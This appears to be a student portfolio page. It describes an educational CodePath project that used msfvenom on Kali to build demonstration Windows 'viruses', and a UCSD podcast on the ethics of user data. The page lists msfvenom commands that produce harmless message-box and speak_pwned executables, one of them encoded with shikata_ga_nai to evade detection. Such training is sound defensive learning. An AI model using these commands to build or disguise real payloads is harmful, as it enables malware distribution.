          <p>This project was learning about computer vulnerabilities and demonstrating how easy it can be for someone to create malware. The virus project was lead by CodePath to teach how malware is created and how to prevent ourselves from being exposed to malicious hackers. We used an operating system called Kali to learn how to protect ourselves. The viruses were created by a software called <strong>msfvenom</strong>.
          <pre>
            # Commands used for a Multi-payload Virus
            msfvenom -a x86 --platform windows -p windows/messagebox TEXT="Your computer is in Danger" -f  raw > messageBox
            msfvenom -c messageBox -a x86 --platform windows -p windows/speak_pwned -f exe -o pwnedVirus.exe 

            # Commands used for an encrypted virus file 
            msfvenom -a x86 --platform windows -p windows/messagebox TEXT="Encrypted Virus Testing" -e x86/shikata_ga_nai -i 3 -f python -o messageEncrypted
            msfvenom -c messageEncrypted -a x86 --platform windows -p windows/speak_pwned -f exe -0 pyVirus.exe 
          </pre>
          <p>Distributing malware is <strong>illegal</strong> and the use of <code>msfvenom</code> is purely for educational and research purposes.</p>

          <summary>Ethics on Collecting User Data</summary>
          <p>In a dynamic intersection of technology and ethics, I embarked on a collaborative podcast project at UCSD, bringing together a group of esteemed professors to delve into the critical topic of user data ethics. This venture served as a powerful medium to dissect the intricate balance between technology advancement and ethical considerations. With the guidance of my professors and a passionate team of students, we explored the complex world of data collection, data privacy, and the societal implications of modern technology. Each episode featured insightful discussions, diving deep into the ethical dilemmas posed by data collection in today's digital landscape. Through these conversations, I gained a profound understanding of the multifaceted challenges and responsibilities inherent in this ever-evolving field. This project not only expanded my academic horizons but also left me with a deeper appreciation for the critical need to navigate this digital frontier with a keen sense of ethics and responsibility.</p>
